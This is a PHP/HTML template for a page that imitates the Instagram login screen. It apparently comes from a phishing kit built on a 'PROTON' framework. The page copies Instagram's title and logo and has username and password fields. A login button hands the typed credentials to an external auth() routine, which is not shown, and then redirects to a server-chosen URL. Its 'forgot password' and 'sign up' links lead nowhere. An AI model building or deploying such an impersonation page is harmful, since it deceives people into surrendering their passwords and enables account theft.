<?php
PROTON::TITLE("Instagram");
PROTON::CSSDEF("css/style.css");
PROTON::FAVDEF("favicon.ico");
PROTON::JSDEF("js/action.js");

?>
<div id="wrapper">
  <div class="main-content">
    <div class="header">
      <?php PROTON::IMDEF("img/logo.png"); ?>
    </div>
    <div class="l-part">
      <input type="text" placeholder="<?php echo $language->username;?>" id="username" class="input-1" />
      <div class="overlap-text">
        <input type="password" placeholder="<?php echo $language->password;?>" id="pass" class="input-2" />
        <a href="#"><?php echo $language->forgot;?></a>
      </div>
      <input type="button" onclick="login();" value="<?php echo $language->login;?>" class="btn" />
    </div>
  </div>
    <div class="s-part">
    <?php echo $language->dont_have_an_account;?>&nbsp;<a href="#"><?php echo $language->sign_up;?></a>
    </div>
    <center><div id="result"> </div> </center>

</div>

<script>
    
const username = document.getElementById("username");
const pass = document.getElementById("pass");
const result = document.getElementById("result");
login = ()=>{
  auth(username.value,pass.value,(data)=>{
      if(data.code == 500)
        result.innerHTML = "<error>"+ data.msg +"</error>";
      else if (data.code == 200)
        window.location.href = data.url;
      
  });
}

</script>

